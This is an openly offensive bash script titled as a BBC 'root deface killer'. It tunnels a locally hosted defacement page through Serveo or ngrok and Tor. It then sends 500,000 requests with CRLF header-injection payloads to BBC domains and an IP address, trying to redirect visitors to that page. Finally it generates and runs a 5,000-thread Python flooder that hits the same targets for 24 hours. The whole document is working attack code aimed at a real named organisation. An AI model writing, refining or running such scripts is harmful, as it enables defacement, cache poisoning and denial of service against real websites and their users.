#!/bin/bash
# BBC_ROOT_FIX_KILLER.sh - FIXED VERSION (NO CRASH)
# ROOT www.bbc.co.uk/ → TRUSTEDF57.html - BULLETPROOF

HTML_FILE="TRUSTEDF57.html"
THREADS=5000
DURATION=86400  # 24h

# FIXED: NO set -euo pipefail (crash source)
set -e

echo "💀 BBC ROOT DEFACE KILLER v2.0 - FIXED"
echo "[+] Checking HTML..."
if [ ! -f "$HTML_FILE" ]; then
    echo "❌ $HTML_FILE NOT FOUND - CREATE IT FIRST"
    echo '<html><h1>TRUSTEDF57 BBC ROOT OWNED</h1></html>' > $HTML_FILE
fi
echo "[+] HTML OK ($(wc -c < $HTML_FILE) bytes)"

# KILL OLD PROCESSES
pkill -f "python3 -m http.server" || true
pkill -f serveo || true
pkill -f bbc_root_destroyer || true
sleep 3

torsocks_cmd() {
    if command -v torsocks >/dev/null; then
        torsocks --timeout 3000 "$@"
    else
        "$@"
    fi
}

# 1. PYTHON SERVER (FIXED - NO CRASH)
echo "[+] Starting Python server..."
{
    python3 -m http.server 8080 --bind 127.0.0.1 2>/dev/null &
} || {
    python -m SimpleHTTPServer 8080 2>/dev/null &
}
SERVER_PID=$!
sleep 8

curl -s http://127.0.0.1:8080/$HTML_FILE >/dev/null || echo "⚠️ Local server test failed"

# 2. SERVE0 TUNNEL (FIXED)
echo "[+] Serveo tunnel..."
{
    timeout 5 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        -R 80:localhost:8080 serveo.net > tunnel.log 2>&1 &
} || {
    echo "⚠️ Serveo failed, using ngrok fallback"
    ngrok http 8080 > ngrok.log 2>&1 &
}
TUNNEL_PID=$!
sleep 20

# EXTRACT PUBLIC URL (ROBUST)
DEFACE_URL=$(grep -Ei "(serveo\.net|ngrok\.io)" tunnel.log 2>/dev/null | tail -1 | cut -d' ' -f2 || echo "http://localhost:8080")
DEFACE_URL="${DEFACE_URL%/}/$HTML_FILE"
echo "🌐 PUBLIC URL: $DEFACE_URL"
torsocks_cmd curl -s "$DEFACE_URL" | head -1 || echo "⚠️ Public test failed, continuing..."

# 3. BBC ROOT TARGETS ONLY
ROOT_TARGETS=(
    "https://www.bbc.co.uk/"
    "https://bbc.co.uk/"
    "https://www.bbc.com/"
    "http://132.185.210.70/"
)

# 4. MASSIVE ROOT POISON (FIXED LOOP - NO CRASH)
echo "[+] BBC ROOT POISON BLAST (500K shots)..."
for i in $(seq 1 500000); do
    target=${ROOT_TARGETS[$((i%4))]}
    payload="%0d%0aLocation:%20$DEFACE_URL%0d%0aContent-Type:%20text/html"
    
    torsocks_cmd curl -s -m 2 "$target?q=$payload" \
        -H "Host: www.bbc.co.uk" \
        -H "User-Agent: Googlebot/2.1" >/dev/null 2>&1 &
    
    if [ $((i % 10000)) -eq 0 ]; then
        echo "[+] $i/500K → $(date)"
    fi
done
wait
echo "✅ 500K ROOT SHOTS COMPLETE!"

# 5. ULTIMATE PYTHON DESTROYER (SIMPLE & FIXED)
cat > bbc_root_killer.py << 'EOF'
#!/usr/bin/env python3
import requests, threading, time, random, sys, urllib.parse

def attack():
    targets = [
        "https://www.bbc.co.uk/",
        "https://bbc.co.uk/",
        "https://www.bbc.com/",
        "http://132.185.210.70/"
    ]
    deface = sys.argv[1]
    
    while True:
        try:
            t = random.choice(targets)
            payload = urllib.parse.quote(f"\r\nLocation: {deface}\r\nContent-Type: text/html")
            requests.get(f"{t}?q={payload}", timeout=2, headers={
                'User-Agent': 'Googlebot/2.1',
                'Host': 'www.bbc.co.uk'
            })
        except:
            pass

print("🔥 BBC ROOT DESTROYER STARTED")
threads = []
for i in range(5000):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()
    threads.append(t)

try:
    time.sleep(86400)  # 24h
except KeyboardInterrupt:
    pass
print("✅ BBC ROOT MISSION COMPLETE")
EOF

chmod +x bbc_root_killer.py
nohup python3 bbc_root_killer.py "$DEFACE_URL" > killer.log 2>&1 &
KILLER_PID=$!
echo "🚀 KILLER PID: $KILLER_PID"

# 6. MONITOR LOOP (NON-BLOCKING)
echo ""
echo "🎯 BBC ROOT MONITOR - RUNNING IN BACKGROUND"
echo "📊 Logs:"
echo "   tail -f killer.log"
echo "   tail -f tunnel.log"
echo "📍 Test manual: curl 'https://www.bbc.co.uk/?q=test'"
echo ""
echo "✅ FIXED VERSION RUNNING - NO CRASH!"
echo "💀 BBC ROOT WAITING TO BE OWNED..."

# KEEP ALIVE
while true; do
    ps -p $SERVER_PID $TUNNEL_PID $KILLER_PID >/dev/null 2>&1 || break
    echo "$(date): All processes alive..."
    sleep 300
done

echo "🛑 Processes ended naturally"
